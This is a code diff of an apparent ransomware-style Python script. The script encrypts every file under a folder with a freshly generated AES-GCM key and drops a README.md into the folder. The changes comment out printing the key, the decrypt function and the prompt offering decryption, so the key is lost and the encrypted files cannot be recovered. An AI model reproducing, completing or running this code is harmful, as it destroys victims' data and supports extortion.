@@ -5,7 +5,7 @@ from pathlib import Path
 
 key = AESGCM.generate_key(256)
 
-print(key)
+# print(key)
 
 markdown_content = """
 
@@ -43,31 +43,31 @@ def encrypt_contents(folder_name):
 
 
 
-#Remove Later
-def decrypt_contents(folder_name):
+#For Decrypting
+# def decrypt_contents(folder_name):
 
-        for file in folder_name.rglob("*"):
-            if file.is_file():
+#         for file in folder_name.rglob("*"):
+#             if file.is_file():
 
-                 with open(file, 'rb') as f:
-                      content = f.read()
+#                  with open(file, 'rb') as f:
+#                       content = f.read()
 
-                 nonce = content[:12]
-                 decrypt = content[12:]
+#                  nonce = content[:12]
+#                  decrypt = content[12:]
 
-                 decrypt_file = aes.decrypt(nonce, decrypt, None)
+#                  decrypt_file = aes.decrypt(nonce, decrypt, None)
 
-                 with open (file, "wb") as f:
-                      f.write(decrypt_file)
+#                  with open (file, "wb") as f:
+#                       f.write(decrypt_file)
 
 
 
 encrypt_contents(Path(fr"{folder}"))
 
-decrypt_folder = input('Decrypt Folder? Y/N: ').lower()
-
-if decrypt_folder == "y":
-     decrypt_contents(Path(fr"{folder}"))
-
 with open(Path(fr"{folder}") / "README.md", "wb") as read:
      read.write(markdown_content.encode())
+
+# decrypt_folder = input('Decrypt Folder? Y/N: ').lower()
+
+# if decrypt_folder == "y":
+#      decrypt_contents(Path(fr"{folder}"))
